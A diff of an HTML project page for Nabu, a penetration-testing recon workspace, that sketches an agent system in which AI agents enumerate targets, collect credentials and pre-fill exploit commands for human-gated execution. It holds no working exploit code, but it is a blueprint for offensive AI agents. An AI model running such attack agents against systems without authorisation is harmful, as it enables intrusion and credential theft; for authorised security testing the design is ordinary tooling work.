@@ -2,516 +2,191 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Nabu — Recon → Exploitation, end to end</title>
+<!-- Nabu — presentation / index page. Source artifact: https://claude.ai/code/artifact/49ea815c-382c-484a-b6af-75e656d4a832
+     Self-contained; the "three views" links open the live interactive artifacts on claude.ai. -->
+<title>Nabu — Recon Workspace &amp; Agent Platform</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <style>
-:root{
- --ink:#0f1420;--surface:#161d2b;--surface-2:#1b2434;--border:#2a3446;--text:#e6e9ef;
- --muted:#8a94a6;--gold:#c9a227;--gold-soft:rgba(201,162,39,.14);--teal:#5b8a8f;
- --teal-soft:rgba(91,138,143,.16);--red:#c8544f;--green:#5aa06a;--blue:#5b7fb0;
- --sans:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;
- --serif:"Iowan Old Style","Palatino Linotype",Palatino,"Book Antiqua",Georgia,serif;
- --mono:"JetBrains Mono","SF Mono","DejaVu Sans Mono",Consolas,monospace;}
-:root[data-theme="light"]{--ink:#f2ede1;--surface:#fbf8f0;--surface-2:#f4efe2;--border:#ddd3bf;
- --text:#1f2633;--muted:#6b6656;--gold:#9a7415;--gold-soft:rgba(154,116,21,.12);--teal:#3f6f74;
- --teal-soft:rgba(63,111,116,.12);}
-*{box-sizing:border-box}
-html,body{margin:0;height:100%}
-body{background:var(--ink);color:var(--text);font-family:var(--sans);-webkit-font-smoothing:antialiased;overflow:hidden}
-.deck{height:100vh;display:flex;flex-direction:column}
-.bar{display:flex;align-items:center;gap:14px;padding:9px 20px;border-bottom:1px solid var(--border);background:var(--surface);flex:0 0 auto}
-.brand{display:flex;align-items:center;gap:10px;font-weight:700}
-.owl{width:30px;height:30px;border-radius:8px;background:var(--gold-soft);border:1px solid var(--gold);display:grid;place-items:center;color:var(--gold);font-size:15px}
-.brand .tag{color:var(--muted);font-weight:500;font-size:12.5px}
-.bar .spacer{flex:1}
-.bar button{background:var(--surface-2);color:var(--text);border:1px solid var(--border);border-radius:8px;padding:6px 12px;font:inherit;font-size:13px;cursor:pointer}
-.bar button:hover{border-color:var(--gold)}
-.counter{color:var(--muted);font-variant-numeric:tabular-nums;font-size:13px;min-width:56px;text-align:center}
-.progress{height:3px;background:var(--border);flex:0 0 auto}
-.progress > i{display:block;height:100%;background:var(--gold);width:0;transition:width .35s ease}
-.stage{flex:1;position:relative;overflow:hidden}
-.slide{position:absolute;inset:0;padding:24px 5vw 42px;display:flex;flex-direction:column;opacity:0;transform:translateY(14px);pointer-events:none;transition:opacity .4s ease,transform .4s ease;overflow:auto}
-.slide.active{opacity:1;transform:none;pointer-events:auto}
-.eyebrow{color:var(--teal);font-weight:700;letter-spacing:.14em;text-transform:uppercase;font-size:11.5px;margin-bottom:6px}
-.eyebrow .new{color:var(--gold);border:1px solid var(--gold);border-radius:4px;padding:1px 6px;margin-left:8px;font-size:10.5px}
-h1{font-family:var(--serif);font-size:clamp(30px,4.4vw,54px);line-height:1.06;margin:0 0 14px;font-weight:600;text-wrap:balance}
-h2{font-family:var(--serif);font-size:clamp(21px,2.8vw,34px);line-height:1.12;margin:0 0 6px;font-weight:600;text-wrap:balance}
-.lede{font-size:clamp(15px,1.5vw,20px);color:var(--muted);max-width:62ch;line-height:1.5;margin:0 0 14px}
-.center{align-items:center;justify-content:center;text-align:center}
-.center .lede{margin-left:auto;margin-right:auto}
-b,strong{color:var(--text)} .gold{color:var(--gold)}
-.body{display:grid;grid-template-columns:1.5fr .92fr;gap:26px;align-items:center;flex:1;min-height:0}
-.body.even{grid-template-columns:1.2fr .88fr}
-@media(max-width:940px){.body{grid-template-columns:1fr;gap:16px}}
-.showcase{display:flex;flex-direction:column;gap:14px;flex:1;min-height:0;align-items:center}
-.showcase .shot{max-width:min(100%,1140px)}
-.showcase .shot img{max-height:58vh;width:auto;max-width:100%}
-.showcase.hero .shot{max-width:min(100%,1360px)}
-.showcase.hero .shot img{max-height:72vh}
-.prow{display:flex;gap:22px;flex-wrap:wrap;justify-content:center;width:100%;max-width:1080px}
-.prow .p{flex:1 1 210px;max-width:330px}
-.prow .p .h{color:var(--gold);font-weight:700;display:block;margin-bottom:2px;font-size:14.5px}
-.prow .p small{color:var(--muted);font-size:13px;line-height:1.42}
-.shot{border:1px solid var(--border);border-radius:12px;overflow:hidden;background:var(--surface);box-shadow:0 16px 42px rgba(0,0,0,.42)}
-.shot img{display:block;width:100%;height:auto}
-.body .shot img{max-height:63vh;object-fit:contain}
-.shot .cap{padding:7px 12px;border-top:1px solid var(--border);color:var(--muted);font-size:12.5px;background:var(--surface-2)}
-ul.points{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:12px}
-ul.points li{position:relative;padding-left:28px;font-size:clamp(14px,1.42vw,17px);line-height:1.4}
-ul.points li::before{content:"";position:absolute;left:0;top:.42em;width:11px;height:11px;border-radius:3px;background:var(--gold);box-shadow:0 0 0 4px var(--gold-soft)}
-ul.points li .h{color:var(--text);font-weight:700} ul.points li small{color:var(--muted)}
-.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;width:100%;max-width:940px;margin:6px auto 0}
-@media(max-width:820px){.stats{grid-template-columns:repeat(2,1fr)}}
-.stat{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:18px 14px;text-align:center}
-.stat .n{font-family:var(--serif);font-size:clamp(26px,3.6vw,40px);color:var(--gold);line-height:1;font-weight:600;font-variant-numeric:tabular-nums}
-.stat .l{color:var(--muted);font-size:12.5px;margin-top:7px;line-height:1.35}
-.chips{display:flex;flex-wrap:wrap;gap:7px;max-width:60ch}
-.chip{background:var(--surface-2);border:1px solid var(--border);border-radius:999px;padding:5px 12px;font-size:13px;color:var(--text)}
-.chip.hot{border-color:var(--gold);color:var(--gold)}
-.note{background:var(--teal-soft);border:1px solid var(--teal);border-left-width:4px;border-radius:10px;padding:14px 16px;font-size:14.5px;line-height:1.5;max-width:64ch}
-.note.warn{background:var(--gold-soft);border-color:var(--gold)}
-.note .t{display:block;font-weight:700;margin-bottom:4px;color:var(--text)}
-.legal{display:grid;grid-template-columns:1fr 1fr;gap:12px;width:100%}
-.legal .box{border:1px solid var(--border);border-radius:11px;padding:12px 14px;background:var(--surface)}
-.legal .box.yes{border-color:var(--green)} .legal .box.no{border-color:var(--red)}
-.legal .box h4{margin:0 0 7px;font-size:13px} .legal .box.yes h4{color:var(--green)} .legal .box.no h4{color:var(--red)}
-.legal .box ul{margin:0;padding-left:16px;line-height:1.5;font-size:12.5px;color:var(--muted)}
-.legal .box ul b{color:var(--text)}
-.tier{display:flex;gap:10px;align-items:flex-start;margin-bottom:11px}
-.tier .b{flex:0 0 auto;font-size:11px;font-weight:700;letter-spacing:.05em;text-transform:uppercase;padding:3px 9px;border-radius:6px;border:1px solid;margin-top:2px}
-.tier .b.a{color:var(--green);border-color:var(--green)}.tier .b.s{color:var(--gold);border-color:var(--gold)}.tier .b.o{color:var(--red);border-color:var(--red)}
-.tier .d{font-size:14px;line-height:1.4} .tier .d b{color:var(--text)} .tier .d small{color:var(--muted)}
-.steps{list-style:none;counter-reset:st;padding:0;margin:0;display:flex;flex-direction:column;gap:13px}
-.steps li{counter-increment:st;position:relative;padding-left:40px;font-size:15px;line-height:1.4}
-.steps li::before{content:counter(st);position:absolute;left:0;top:-1px;width:27px;height:27px;border-radius:50%;background:var(--gold-soft);border:1px solid var(--gold);color:var(--gold);font-weight:700;font-size:13.5px;display:grid;place-items:center}
-.steps li b{color:var(--text)} .steps li .where{color:var(--teal);font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.06em;margin-left:6px}
-.steps code{font-family:var(--mono);font-size:12.5px;background:#0b0f18;border:1px solid var(--border);border-radius:6px;padding:3px 8px;color:#e2e9f2;display:block;margin-top:5px;overflow-x:auto;white-space:nowrap}
-.steps code .g{color:var(--green)} .steps code .m{color:var(--muted)}
-/* ligolo slide: inputs panel + generated-command timeline */
-.lg-grid{display:grid;grid-template-columns:minmax(0,.82fr) minmax(0,1.18fr);gap:34px;align-items:start;width:100%;max-width:1240px;margin:auto}
-@media(max-width:920px){.lg-grid{grid-template-columns:1fr;gap:18px}}
-.lg-inputs{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:6px 22px 12px;box-shadow:0 12px 34px rgba(0,0,0,.3)}
-.lg-inhead{color:var(--muted);font-size:13px;padding:14px 0 12px;border-bottom:1px solid var(--border)}
-.lg-inhead b{color:var(--gold)}
-.lg-field{display:flex;justify-content:space-between;align-items:center;gap:14px;padding:11px 0;border-bottom:1px dashed var(--border)}
-.lg-field:last-child{border-bottom:0}
-.lg-field span{color:var(--muted);font-size:13px}
-.lg-field code{font-family:var(--mono);font-size:13px;color:var(--text);text-align:right;line-height:1.45}
-.lg-time{list-style:none;margin:0;padding:0}
-.lg-time li{position:relative;padding:0 0 15px 46px}
-.lg-time li:last-child{padding-bottom:0}
-.lg-time li::before{content:"";position:absolute;left:16px;top:30px;bottom:-4px;width:2px;background:var(--border)}
-.lg-time li:last-child::before{display:none}
-.lg-num{position:absolute;left:0;top:0;width:34px;height:34px;border-radius:50%;background:var(--gold);color:#1a1200;font-weight:800;font-size:15px;display:grid;place-items:center;z-index:1;box-shadow:0 3px 10px rgba(0,0,0,.4)}
-.lg-body{background:var(--surface);border:1px solid var(--border);border-radius:11px;padding:11px 14px;min-width:0}
-.lg-bh{display:flex;align-items:center;gap:10px;margin-bottom:8px}
-.lg-bh b{font-size:15px}
-.lg-loc{font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);border:1px solid var(--border);border-radius:6px;padding:3px 9px;display:inline-flex;align-items:center;gap:6px;white-space:nowrap}
-.lg-loc::before{content:"";width:7px;height:7px;border-radius:50%;flex:0 0 auto}
-.lg-loc.kali::before{background:var(--blue)}.lg-loc.host::before{background:var(--red)}.lg-loc.console::before{background:var(--gold)}.lg-loc.nabu::before{background:var(--teal)}
-.lg-copy{margin-left:auto;font-size:11px;color:var(--muted);border:1px solid var(--border);border-radius:6px;padding:2px 9px;background:var(--surface-2);flex:0 0 auto}
-.lg-body code{font-family:var(--mono);font-size:12.5px;background:#0b0f18;border:1px solid var(--border);border-radius:7px;padding:8px 11px;color:#e2e9f2;display:block;overflow-x:auto;white-space:nowrap;line-height:1.55}
-.lg-body code .g{color:var(--green)}.lg-body code .m{color:var(--muted)}
-.lg-innote{color:var(--muted);font-size:12px;line-height:1.45;margin-top:13px;padding-top:12px;border-top:1px solid var(--border)}
-.lg-result{margin-top:16px;color:var(--teal);font-size:14px;font-weight:600;padding-left:46px}
-.lg-result span{color:var(--muted);font-weight:400}
-.term{font-family:var(--mono);font-size:13px;background:#0b0f18;border:1px solid var(--border);border-radius:10px;padding:15px 17px;line-height:1.55;overflow:auto;box-shadow:0 16px 42px rgba(0,0,0,.42);width:100%}
-.term .c{color:var(--teal)} .term .pr{color:var(--gold)} .term .g{color:var(--green)} .term .m{color:var(--muted)}
-.kbd{font-family:var(--mono);font-size:12px;background:var(--surface-2);border:1px solid var(--border);border-radius:5px;padding:1px 6px}
-.hintbar{position:absolute;bottom:10px;left:0;right:0;text-align:center;color:var(--muted);font-size:12px;pointer-events:none}
-.nav-arrow{position:absolute;top:50%;transform:translateY(-50%);z-index:20;width:52px;height:52px;border-radius:50%;border:1px solid var(--border);background:var(--surface-2);color:var(--text);font-size:30px;line-height:1;font-family:var(--serif);display:grid;place-items:center;cursor:pointer;box-shadow:0 6px 20px rgba(0,0,0,.28);transition:opacity .2s,border-color .2s,color .2s,transform .12s}
-.nav-arrow:hover{border-color:var(--gold);color:var(--gold)}
-.nav-arrow:active{transform:translateY(-50%) scale(.94)}
-.nav-arrow.left{left:18px}.nav-arrow.right{right:18px}
-.nav-arrow span{transform:translateY(-2px)}
-.nav-arrow:disabled{opacity:.22;cursor:default;pointer-events:none}
-.nav-arrow:focus-visible{outline:2px solid var(--gold);outline-offset:3px}
-@media(max-width:720px){.nav-arrow{width:42px;height:42px;font-size:24px}.nav-arrow.left{left:6px}.nav-arrow.right{right:6px}}
-@media(prefers-reduced-motion:reduce){.slide,.nav-arrow,.progress>i{transition:none}}
+  :root{color-scheme:light dark;
+    --ground:#f4f7f6;--panel:#fff;--panel-2:#eef2f0;--sunk:#e6ece9;--ink:#16221e;--ink-2:#3c4a45;--muted:#6a7a73;--line:#d3ddd9;--line-2:#c2cfca;
+    --brand:#0f9d8c;--brand-ink:#0b7568;--gold:#b7791f;--gold-soft:#fbeecb;--gold-ink:#8a5a12;
+    --agent:#0f9d8c;--gated:#b7791f;--tool:#5a63c4;--store:#2b7fb8;--infra:#64748b;
+    --shadow:0 1px 2px rgba(16,32,28,.05),0 8px 22px rgba(16,32,28,.06);
+    --mono:"JetBrains Mono","Cascadia Code","SF Mono",ui-monospace,Menlo,Consolas,monospace;--sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}
+  @media (prefers-color-scheme:dark){:root{
+    --ground:#0c1116;--panel:#131b22;--panel-2:#182029;--sunk:#0e141a;--ink:#e7eef2;--ink-2:#b7c4cc;--muted:#8394a0;--line:#233039;--line-2:#2e3d48;
+    --brand:#35d0ba;--brand-ink:#6ee3d0;--gold:#f0b429;--gold-soft:#2a2413;--gold-ink:#f0c256;
+    --agent:#35d0ba;--gated:#f0b429;--tool:#8c94f2;--store:#4fb6f0;--infra:#93a2b0;
+    --shadow:0 1px 2px rgba(0,0,0,.4),0 10px 28px rgba(0,0,0,.34);}}
+  :root[data-theme="light"]{color-scheme:light;--ground:#f4f7f6;--panel:#fff;--panel-2:#eef2f0;--sunk:#e6ece9;--ink:#16221e;--ink-2:#3c4a45;--muted:#6a7a73;--line:#d3ddd9;--line-2:#c2cfca;--brand:#0f9d8c;--brand-ink:#0b7568;--gold:#b7791f;--gold-soft:#fbeecb;--gold-ink:#8a5a12;--agent:#0f9d8c;--gated:#b7791f;--tool:#5a63c4;--store:#2b7fb8;--infra:#64748b;--shadow:0 1px 2px rgba(16,32,28,.05),0 8px 22px rgba(16,32,28,.06);}
+  :root[data-theme="dark"]{color-scheme:dark;--ground:#0c1116;--panel:#131b22;--panel-2:#182029;--sunk:#0e141a;--ink:#e7eef2;--ink-2:#b7c4cc;--muted:#8394a0;--line:#233039;--line-2:#2e3d48;--brand:#35d0ba;--brand-ink:#6ee3d0;--gold:#f0b429;--gold-soft:#2a2413;--gold-ink:#f0c256;--agent:#35d0ba;--gated:#f0b429;--tool:#8c94f2;--store:#4fb6f0;--infra:#93a2b0;--shadow:0 1px 2px rgba(0,0,0,.4),0 10px 28px rgba(0,0,0,.34);}
+
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--ground);color:var(--ink);font-family:var(--sans);font-size:15px;line-height:1.55;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 22px}
+  .mono{font-family:var(--mono)}
+  a{color:var(--brand-ink);text-decoration:none}
+  .eyebrow{font-family:var(--mono);font-size:11px;letter-spacing:.18em;text-transform:uppercase;color:var(--muted);font-weight:600}
+  header.bar{position:sticky;top:0;z-index:40;background:color-mix(in srgb,var(--ground) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+  .bar-in{display:flex;align-items:center;gap:12px;height:56px}
+  .brand{display:flex;align-items:center;gap:9px;font-family:var(--mono);font-weight:700}
+  .brand .dot{width:10px;height:10px;border-radius:50%;background:var(--brand);box-shadow:0 0 0 4px color-mix(in srgb,var(--brand) 22%,transparent)}
+  .brand b{font-size:15px}.brand span{color:var(--muted);font-size:12px}.grow{flex:1}
+  .btn{font-family:var(--mono);font-size:12px;color:var(--ink-2);background:var(--panel);border:1px solid var(--line-2);border-radius:8px;padding:7px 11px;cursor:pointer}
+  .btn:hover{border-color:var(--brand);color:var(--brand-ink)}
+  .coffee{font-family:var(--mono);font-size:12px;color:var(--gold-ink);background:var(--gold-soft);border:1px solid color-mix(in srgb,var(--gold) 45%,var(--line-2));border-radius:8px;padding:7px 11px;font-weight:600}
+  .coffee:hover{border-color:var(--gold)}
+
+  .hero{padding:52px 0 10px}
+  .hero h1{font-family:var(--mono);font-weight:700;letter-spacing:-.02em;font-size:clamp(30px,5.2vw,52px);line-height:1.03;margin:16px 0 14px;text-wrap:balance}
+  .hero h1 .a{color:var(--brand)}
+  .lede{font-size:clamp(16px,2vw,19px);color:var(--ink-2);max-width:68ch;margin:0}
+  .byline{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:22px;font-family:var(--mono);font-size:12.5px;color:var(--ink-2)}
+  .byline .who{font-weight:700;color:var(--ink)}
+  .byline a{border-bottom:1px solid color-mix(in srgb,var(--brand) 40%,transparent)}
+  .byline .sep{color:var(--line-2)}
+
+  .stats{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:30px 0 6px}
+  .stat{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:13px 14px;box-shadow:var(--shadow)}
+  .stat b{font-family:var(--mono);font-size:23px;font-variant-numeric:tabular-nums;display:block;line-height:1}
+  .stat small{color:var(--muted);font-size:10.5px;letter-spacing:.03em;display:block;margin-top:5px;text-transform:uppercase}
+
+  section{padding:34px 0}
+  .sec-head{display:flex;align-items:baseline;gap:12px;margin-bottom:5px}
+  .sec-head h2{font-family:var(--mono);font-weight:700;font-size:22px;margin:0}
+  .sec-head .num{font-family:var(--mono);color:var(--brand);font-weight:700;font-size:13px}
+  .sec-sub{color:var(--muted);max-width:80ch;margin:2px 0 20px;font-size:14px}
+
+  /* view cards */
+  .views{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  .view{display:flex;flex-direction:column;border:1px solid var(--line);background:var(--panel);border-radius:16px;padding:20px;box-shadow:var(--shadow);text-decoration:none;color:inherit;transition:transform .12s,box-shadow .12s,border-color .12s;border-top:4px solid var(--vc)}
+  .view:hover{transform:translateY(-4px);box-shadow:0 4px 10px rgba(16,32,28,.08),0 18px 40px rgba(16,32,28,.12);border-color:var(--vc)}
+  .view .ic{font-size:26px;line-height:1}
+  .view h3{font-family:var(--mono);font-size:17px;margin:14px 0 6px;letter-spacing:-.01em}
+  .view p{font-size:13.5px;color:var(--ink-2);margin:0 0 14px;flex:1}
+  .view .inside{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:16px}
+  .view .inside span{font-family:var(--mono);font-size:10px;border:1px solid var(--line-2);border-radius:6px;padding:3px 6px;color:var(--muted)}
+  .view .go{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--vc);display:flex;align-items:center;gap:6px}
+
+  /* agent-system panel */
+  .counts{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:22px}
+  .count{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:14px 16px;box-shadow:var(--shadow);border-left:3px solid var(--c)}
+  .count b{font-family:var(--mono);font-size:28px;font-variant-numeric:tabular-nums;display:block;line-height:1}
+  .count small{color:var(--muted);font-size:11px;letter-spacing:.03em}
+  .count .sub{color:var(--ink-2);font-size:11px;margin-top:3px}
+  .lg{display:inline-flex;align-items:center;gap:6px;font-family:var(--mono);font-size:11.5px;color:var(--ink-2)}
+  .lg .d{width:10px;height:10px;border-radius:50%;background:var(--c)}
+  .lgrow{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:16px}
+
+  .layer{border:1px solid var(--line);border-radius:13px;background:var(--panel);box-shadow:var(--shadow);overflow:hidden;margin-bottom:11px}
+  .layer-h{display:flex;align-items:center;gap:10px;padding:9px 15px;background:var(--panel-2);border-bottom:1px solid var(--line)}
+  .layer-h .tag{font-family:var(--mono);font-size:10.5px;letter-spacing:.13em;text-transform:uppercase;font-weight:700;color:var(--lc)}
+  .layer-h .desc{color:var(--muted);font-size:12px}
+  .layer-b{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:9px;padding:13px 15px}
+  .ag{border:1px solid var(--line-2);border-left:3px solid var(--agent);border-radius:9px;padding:9px 11px}
+  .ag.gated{border-left-color:var(--gated)}
+  .ag .nm{font-weight:650;font-size:13px;display:flex;align-items:center;gap:6px;line-height:1.2}
+  .ag .nm .mk{font-family:var(--mono);font-size:11px;color:var(--agent)} .ag.gated .nm .mk{color:var(--gated)}
+  .ag .rl{font-size:11px;color:var(--ink-2);margin-top:4px;line-height:1.35;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+  .ag .inst{font-family:var(--mono);font-size:9px;color:var(--muted);margin-top:5px;text-transform:uppercase;letter-spacing:.04em}
+
+  .note{display:flex;gap:10px;padding:13px 15px;border-radius:12px;background:color-mix(in srgb,var(--brand) 8%,transparent);border:1px solid color-mix(in srgb,var(--brand) 32%,var(--line-2));margin-top:8px}
+  .note b{color:var(--brand-ink)} .note p{margin:0;font-size:13px;color:var(--ink-2)}
+
+  footer{border-top:1px solid var(--line);margin-top:26px;padding:30px 0 64px}
+  .foot{display:flex;flex-wrap:wrap;align-items:center;gap:12px;font-family:var(--mono);font-size:13px;color:var(--ink-2)}
+  .foot .who{font-weight:700;color:var(--ink)} .foot .sep{color:var(--line-2)}
+  .foot .cf{color:var(--gold-ink);font-weight:700}
+  @media (max-width:900px){.views{grid-template-columns:1fr}.stats{grid-template-columns:repeat(3,1fr)}.counts{grid-template-columns:repeat(2,1fr)}}
+  @media (prefers-reduced-motion:reduce){*{transition:none!important}}
 </style>
 </head>
 <body>
-<div class="deck">
-  <div class="bar">
-    <div class="brand"><span class="owl">{o,o}</span><div>Nabu — <span class="tag">Local Recon &amp; Exploitation Workspace</span></div></div>
-    <div class="spacer"></div>
-    <button id="autoplay" type="button">▶ Autoplay</button>
-    <button id="theme" type="button">◐ Theme</button>
-    <span class="counter"><span id="cur">1</span> / <span id="tot">21</span></span>
+<header class="bar"><div class="wrap bar-in">
+  <div class="brand"><span class="dot"></span><b>NABU</b><span>· by Lagus</span></div>
+  <div class="grow"></div>
+  <a class="btn" href="https://github.com/7H35C4r3Cr0W/recon" target="_blank">GitHub ↗</a>
+  <a class="coffee" href="https://buymeacoffee.com/lagus" target="_blank">☕ Buy me a coffee</a>
+  <button class="btn" id="theme">◐</button>
+</div></header>
+
+<main>
+  <div class="wrap">
+    <div class="hero">
+      <div class="eyebrow">Local Recon Workspace · OSCP exam-legal by default · and where it goes next</div>
+      <h1>Nabu turns a scan into a plan — <span class="a">and could turn that plan into an agent team.</span></h1>
+      <p class="lede">A PySide6 desktop + CLI recon orchestrator that wraps standard OSCP-allowed tools, surfaces findings in a graph, and produces clean reports — recon-first, offline, no auto-exploitation. Below: the finished tool, and the blueprint for augmenting it with an agent-to-agent system for pentesters. Three interactive views, one page.</p>
+      <div class="byline">
+        <span>Built by</span><span class="who">Lagus</span>
+        <span class="sep">·</span><a href="https://github.com/7H35C4r3Cr0W/recon" target="_blank">github.com/7H35C4r3Cr0W/recon</a>
+        <span class="sep">·</span><a href="mailto:its.lagus@proton.me">its.lagus@proton.me</a>
+        <span class="sep">·</span><a href="https://buymeacoffee.com/lagus" target="_blank">☕ buymeacoffee.com/lagus</a>
+      </div>
+      <div class="stats" id="stats"></div>
+    </div>
   </div>
-  <div class="progress"><i id="bar"></i></div>
-  <div class="stage" id="stage">
-    <button class="nav-arrow left" id="navPrev" type="button" aria-label="Previous slide"><span>‹</span></button>
-    <button class="nav-arrow right" id="navNext" type="button" aria-label="Next slide"><span>›</span></button>
+
+  <div class="wrap">
+    <section>
+      <div class="sec-head"><span class="num">01</span><h2>The three views</h2></div>
+      <p class="sec-sub">Each opens in its own tab. Together they tell the whole story: how the tool works today, what an agent version would look like, and how you would build it.</p>
+      <div class="views" id="views"></div>
+    </section>
+
+    <section>
+      <div class="sec-head"><span class="num">02</span><h2>The agent system at a glance</h2></div>
+      <p class="sec-sub">If Nabu were augmented with agent-to-agent features, this is the full cast — a small, deliberate set of <b>agents</b>, not one per module. The 52 recon modules and 183-service catalog are <b>tools</b> the agents call. Recon runs autonomously; every attack agent waits at a human gate.</p>
+      <div class="counts" id="counts"></div>
+      <div class="lgrow" id="lgrow"></div>
+      <div id="layers"></div>
+      <div class="note"><span>▸</span><p><b>Why so few agents?</b> A sane design does not spawn an agent per exploit — that is thousands of agents and no coordination. Nabu's ~3,187 catalog actions live behind <b>23 tools</b>; the 20 agents decide <i>which</i> tool to call and <i>when</i>. Open the <a href="#" id="lk-map2">Agent Map</a> to trace any agent to the tools it uses.</p></div>
+    </section>
   </div>
-</div>
+
+  <div class="wrap"><footer><div class="foot">
+    <span class="who">Nabu</span><span>— Local Recon Workspace</span>
+    <span class="sep">·</span><span>by Lagus</span>
+    <span class="sep">·</span><a href="https://github.com/7H35C4r3Cr0W/recon" target="_blank">github.com/7H35C4r3Cr0W/recon</a>
+    <span class="sep">·</span><a href="mailto:its.lagus@proton.me">its.lagus@proton.me</a>
+    <span class="sep">·</span><a class="cf" href="https://buymeacoffee.com/lagus" target="_blank">☕ Buy me a coffee — buymeacoffee.com/lagus</a>
+  </div></footer></div>
+</main>
 
 <script>
-"use strict";
-const S = (name, alt) => `<div class="shot"><img src="screenshots/${name}" alt="${alt}" loading="lazy">`;
+const INV={"classify":{"agents":[{"id":"intake","name":"Operator Liaison Agent","layer":"portal","role":"Natural-language bridge between the human operator and the agent mesh; the surface that relays every attack confirmation.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-doctor","t-project-ops"],"reads_stores":["s-profile","s-notes","s-report"],"hands_off_to":["orchestrator"],"does":"Converts operator intent into engagement goals and streams status/next-steps back in plain language. Runs the doctor preflight at session start and is the console surface where the operator answers every human-gate attack confirmation. Holds no attack capability of its own."},{"id":"orchestrator","name":"Engagement Orchestrator","layer":"orchestration","role":"Owns the project lifecycle and plan; enforces recon->analysis->attack phase ordering (no autopwn) and dispatches to leads.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-doctor","t-project-ops"],"reads_stores":["s-profile","s-findings","s-audit","s-notes"],"hands_off_to":["recon-lead","analysis-lead","attack-planner","report-agent","pivot-agent"],"does":"Decomposes the operator goal into phases and enforces strict recon->analysis->attack ordering so nothing auto-chains from scan to exploit. Dispatches work to the recon, analysis, attack and reporting leads and checks scope before any phase advances. Never executes a target action itself."},{"id":"attack-planner","name":"Exploitation Strategist","layer":"orchestration","role":"The attack brain: selects candidate exploit-catalog actions and pre-fills exact per-target commands, but never executes.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-exploit-web","t-exploit-ad","t-exploit-services","t-exploit-linux","t-exploit-windows","t-searchsploit"],"reads_stores":["s-findings","s-creds","s-profile"],"hands_off_to":["web-attack","ad-attack","svc-attack","privesc-linux","privesc-windows","spray-agent"],"does":"Reads correlated findings plus reference matches and selects the most promising exploit-catalog actions for the discovered surface, filling each command from the profile and a chosen vault credential. It NEVER runs anything and never chains actions; it hands each built command to a human-gated executor where the operator confirms. Living in orchestration keeps the attack layer purely human-gated executors."},{"id":"recon-lead","name":"Recon Coordinator","layer":"recon","role":"Owns discovery: runs the staged nmap entry scan and spawns the per-service/per-web/per-domain recon workers.","autonomy":"autonomous","instantiation":"singleton","calls_tools":["t-nmap","t-project-ops"],"reads_stores":["s-profile","s-findings","s-service-out"],"hands_off_to":["service-enum","web-recon","ad-mapper","analysis-lead"],"does":"Runs the staged TCP/UDP nmap scan that is the engagement entry point and reads discovered_services from the profile. Instantiates one Service-Enum Agent per discovered service, a Web-Recon Agent per HTTP(S) port and an AD-Mapper per domain, then collates their findings and decides enum depth. Read-only; gated to discovered services only."},{"id":"service-enum","name":"Service Enumeration Agent","layer":"recon","role":"One per discovered service; runs the tiered read-only enum for its port and parses findings.","autonomy":"autonomous","instantiation":"per-service","calls_tools":["t-recon-enum","t-peek"],"reads_stores":["s-profile","s-findings","s-creds","s-service-out"],"hands_off_to":["analysis-lead","cred-manager","ref-analyst"],"does":"Instantiated once per discovered service (smb/ldap/ftp/snmp/\u2026), it runs the tiered read-only nabu-cli enum for its port, parses tool output into findings and previews readable files via peek. On null-session/anonymous success it auto-propagates a credential to the vault. Strictly Tier-1 recon; it never guesses lists or sprays."},{"id":"web-recon","name":"Web Content & Vhost Agent","layer":"recon","role":"One per HTTP(S) port; drives content discovery, vhost fuzzing, fingerprinting and the discovered-URLs sitemap.","autonomy":"autonomous","instantiation":"per-service","calls_tools":["t-recon-enum","t-wordlists"],"reads_stores":["s-findings","s-service-out","s-profile"],"hands_off_to":["analysis-lead","ref-analyst","cred-manager"],"does":"Runs per web port: content discovery (feroxbuster/gobuster/ffuf/dirsearch), vhost/subdomain fuzzing with wildcard-size filtering, whatweb/nikto fingerprinting and wpscan --enumerate. Builds the sortable discovered-URLs sitemap and flags source/backup/VCS disclosures. In default mode the wordlist picker filters Passwords/, so it does content discovery only, never login brute."},{"id":"ad-mapper","name":"Active Directory Mapper Agent","layer":"recon","role":"One per discovered domain; BloodHound-style collection plus LDAP/Kerberos/SMB enum, builds the AD attack-path graph.","autonomy":"autonomous","instantiation":"per-domain","calls_tools":["t-recon-enum","t-graph"],"reads_stores":["s-findings","s-creds","s-graph","s-profile"],"hands_off_to":["analysis-lead","ad-attack"],"does":"Per discovered domain, runs BloodHound-style collection plus LDAP/Kerberos/SMB enumeration and builds the AD attack-path graph. Surfaces roastable users, delegations, ACL abuse candidates and ADCS templates as attack paths. Read-only enumeration; it maps, the AD Attack Agent acts."},{"id":"analysis-lead","name":"Findings Correlation Agent","layer":"analysis","role":"Correlates findings across services, ranks the attack surface and runs the pattern/suggestion 